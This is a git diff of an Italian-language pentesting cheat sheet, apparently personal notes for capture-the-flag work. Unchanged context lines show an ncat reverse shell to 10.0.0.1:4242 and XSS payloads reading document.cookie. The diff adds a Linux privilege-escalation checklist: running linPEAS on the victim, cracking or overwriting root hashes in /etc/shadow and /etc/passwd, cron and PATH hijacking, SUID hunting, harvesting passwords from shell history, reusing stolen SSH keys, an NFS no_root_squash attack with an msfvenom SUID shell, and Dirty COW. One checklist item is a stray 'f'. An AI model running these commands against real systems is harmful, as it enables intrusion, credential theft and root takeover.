@@ -82,3 +82,30 @@ ncat 10.0.0.1 4242 -e /bin/bash
 1. prova a metterlo nella URL se puoi dopo il ?
 2. prova a metterlo in un button come `onclick=alert(document.cookie)`
 3. prova a metterlo nella URL dopo una GET/POST con `&<script>alert(document.cookie)</script>`
+
+
+# PRIVILAGE ESCALATION
+
+La guida che segue è un po' disordinata, è più una lista di metodi da provare che altro. 
+
+0. **CALDAMENTE CONSIGLIATO** Runna [linpeas.sh] (https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) dopo averlo scaricato sulla macchina vittima
+1. Controlla se il file /etc/shadow è readable, cracka la hash del root
+2. Controlla se il file /etc/shadow è writable, genera una nuova password sha-512 `mkpasswd -m sha-512 newpasswordhere` e sostituiscila a root
+3. Controlla se il file /etc/passwd è writable, genera una password con `openssl passwd newpasswordhere` copia la riga iniziale di root alla fine di passwd, sostituisici il primo `root:x` con `newroot:password`, cambia utente in newroot
+4. Usa `sudo -l` e vedi che comandi puoi usare come root, usa [GTFOBins](https://gtfobins.github.io/) per vedere quali permettono di fare privilage escalation
+5. Guarda `cat /etc/crontab`, vedi se ci sono programmi che vengono eseguiti come root e prova a modificarli per avere shell o qualcosa di simile
+6. Guarda `cat /etc/crontab`, vedi il PATH e i programmi che vengono eseguiti come root, crea un programma con lo stesso nome di quello root nella prima cartella in ordine che appare in PATH che ti possa permettere di avere una shell o qualcosa di simile
+7. Guarda `cat /etc/crontab`, vedi se tra  i programmi root si sono WILDCARDS \*, poi usa gli exploit adatti
+8. Guarda `find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null`, cerca se ci sono file soggetti ad exploit da [Exploit DB](https://www.exploit-db.com/)
+9. f
+10. Guarda se magari nella cronologia `cat ~/.*history | less` ha per sbaglio messo la password
+11. Cerca se c'è la chiave SSH da qualche parte, copiala in un file root_key, `chmod 600 root_key`, e poi prova a connetterti con questa chiave `ssh -i root_key -oPubkeyAcceptedKeyTypes=+ssh-rsa -oHostKeyAlgorithms=+ssh-rsa root@IP_VITTIMA`
+12. Guarda `cat /etc/exports`, se ci sono opzioni `no_root_squash` allora puoi usare il `mount` come root per avere privilegi root nella macchina vittima. 
+		 ATTACCANTE (es. su /tmp vulnerabile a no_root_squashing):
+		`mkdir /tmp/nfs` 
+		`mount -o rw,vers=3 IP_VITTIMA(credo):/tmp /tmp/nfs`
+		`msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf`
+		`chmod +xs /tmp/nfs/shell.elf`
+		VITTIMA:
+		`/tmp/shell.elf`
+13. Come ultima istanza, prova un Dirty COW, anche se meglio di no
